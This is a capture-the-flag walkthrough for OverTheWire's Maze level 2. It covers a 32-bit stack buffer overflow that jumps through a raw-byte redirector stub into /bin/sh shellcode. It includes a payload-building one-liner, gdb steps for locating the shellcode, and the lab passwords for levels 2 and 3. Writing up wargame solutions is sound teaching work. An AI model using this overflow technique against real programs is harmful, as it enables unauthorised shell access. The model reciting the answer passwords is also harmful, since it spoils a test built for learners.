# Maze Level 2 → 3

## Goal
Overflow a stack buffer in the level 2 binary and redirect execution into shellcode that lives at a known stack address. Because the full address can contain bytes the parser eats (nulls, whitespace), we use a tiny redirector stub as the immediate overflow target and jump to the real shellcode from there.

## Concepts you'll learn
- Classic stack-buffer overflow on **32-bit x86** (Maze is all 32-bit).
- Why saved-return addresses / function pointers matter.
- Writing an 8-byte `push <addr>; pop eax; call eax` stub in raw bytes.
- Locating shellcode on the stack with `gdb` and re-deriving the address when it drifts.

## How to log in

```
$ ssh maze2@maze.labs.overthewire.org -p 2225
```

Password is `PBeZRPjetr` (from level 1).

## Walkthrough

### 1. Find the overflow
Open the binary in `gdb` and look at the vulnerable `strcpy`/`read`/`gets`-style call. Identify the offset at which you start overwriting the saved EIP (or function pointer) that the program will jump to.

### 2. Pick your shellcode
Any small execve("/bin/sh") payload works — a 25-byte x86 shellcode is fine. Put it somewhere in your input that will land on the stack.

### 3. Find where your shellcode landed
Run under `gdb` with the same environment you'll use for the real exploit, break just before the crash, and inspect the stack to see where the payload sits.

```
$ gdb /maze/maze2
(gdb) run < payload
(gdb) x/40wx $esp
```

On the solver's run, the shellcode started at `0xffffd54a`. **This address is shell-environment sensitive**: environment variables, argv length, and even the cwd shift the stack. If yours differs, re-derive it here — don't trust the number below.

### 4. Build the redirector stub
The overflow target must be small and self-contained. Use an 8-byte stub that pushes the shellcode address, pops it into `eax`, and calls `eax`:

```
\x68 <4-byte little-endian addr> \x58 \xff\xd0
```

For `0xffffd54a` the stub is:

```
\x68\x4a\xd5\xff\xff\x58\xff\xd0
```

### 5. Assemble the full payload
Layout (rough):

```
[ padding to overflow point ] [ address-of-stub ] [ stub (8 bytes) ] [ shellcode ]
```

Or, more simply, land the stub at a predictable stack slot and overwrite the saved return with its address.

```
$ python2 -c 'import sys; sys.stdout.write("A"*<offset> + "<stub_addr>" + "\x68\x4a\xd5\xff\xff\x58\xff\xd0" + "<shellcode>")' > /tmp/p
$ /maze/maze2 < /tmp/p
```

Expected output:

```
$
```

Read the next password:

```
$ cat /etc/maze_pass/maze3
DSEiCewQOv
```

### 6. Log in as maze3

```
$ ssh maze3@maze.labs.overthewire.org -p 2225
```

## The answer

The password for `maze3` is:

**`DSEiCewQOv`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <https://overthewire.org/wargames/maze/maze2.html>
